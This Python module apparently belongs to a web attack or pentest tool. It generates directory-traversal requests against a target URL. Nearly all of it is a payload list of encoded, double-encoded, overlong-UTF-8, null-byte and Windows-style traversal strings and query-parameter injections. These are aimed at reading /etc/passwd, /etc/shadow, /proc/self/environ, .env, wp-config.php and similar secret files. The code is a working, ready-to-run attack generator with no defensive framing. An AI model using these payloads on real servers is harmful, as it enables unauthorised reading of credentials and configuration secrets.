#!/usr/bin/env python3
"""
Directory traversal bypass techniques
"""

import urllib.parse

class DirectoryTraversalBypass:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate directory traversal bypass tests"""
        tests = []
        base_url = self.manager.target_url
        parsed = urllib.parse.urlparse(base_url)
        path = parsed.path if parsed.path else '/'
        
        # Directory traversal patterns
        traversal_patterns = [
            # Basic traversal
            '../',
            '../../',
            '../../../',
            '../../../../',
            '../../../../../',
            '../../../../../../',
            '../../../../../../../',
            '../../../../../../../../',
            '../../../../../../../../../',
            '../../../../../../../../../../',
            
            # Encoded traversal
            '..%2f',
            '..%252f',
            '..%c0%af',
            '..%c1%9c',
            '..%e0%80%af',
            '..%e0%80%5c',
            
            # Double encoded
            '%252e%252e%252f',
            '%252e%252e/',
            '..%252f',
            '%2e%2e%2f',
            '%2e%2e/',
            '..%2f',
            
            # Unicode traversal
            '..%c0%ae',
            '..%c0%ae%c0%ae%c0%af',
            '..%c0%ae%c0%ae/',
            '..%c1%9c%c1%9c%c1%9c',
            
            # Mixed traversal
            '....//',
            '..././',
            '..;/',
            '..%3b/',
            '..%3b%2f',
            '..%3B%2F',
            
            # Alternative separators
            '..\\',
            '..%5c',
            '..%2525%352f',
            '..%2525%255c',
            
            # Null byte traversal
            '../%00',
            '..%2f%00',
            '..%2f%00.php',
            '..%2f%00.html',
            
            # URL encoded with different encodings
            '..%2F',
            '..%2f%2f',
            '..%2f%252f',
            '..%252f%252f',
            
            # Path traversal with params
            '?file=../etc/passwd',
            '?path=../../etc/passwd',
            '?dir=../../etc/passwd',
            '?filename=../../etc/passwd',
            '?page=../../etc/passwd',
            '?include=../../etc/passwd',
            '?template=../../etc/passwd',
            
            # Windows traversal
            '..\\..\\',
            '..\\..\\..\\',
            '..\\..\\..\\..\\',
            '..\\..\\..\\..\\..\\',
            '..%5c..%5c',
            '..%5c..%5c..%5c',
            '..%5c..%5c..%5c..%5c',
            
            # File inclusion
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/self/environ',
            '/proc/version',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
            
            # Common sensitive files
            '.htaccess',
            '.htpasswd',
            'web.config',
            'wp-config.php',
            'config.php',
            'database.ini',
            '.env',
            'application.properties',
            'settings.py',
            'config.yml',
        ]
        
        # Generate tests for each pattern
        for pattern in traversal_patterns:
            if pattern.startswith('?') or pattern.startswith('='):
                # Query parameter traversal
                url = base_url + pattern
            else:
                # Path traversal
                new_path = path
                if not new_path.endswith('/'):
                    new_path += '/'
                new_path += pattern
                
                url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    new_path,
                    parsed.params,
                    parsed.query,
                    parsed.fragment
                ))
            
            tests.append({
                'name': f'Directory Traversal: {pattern[:30]}...',
                'url': url,
                'headers': {},
                'method': 'GET'
            })
        
        return tests
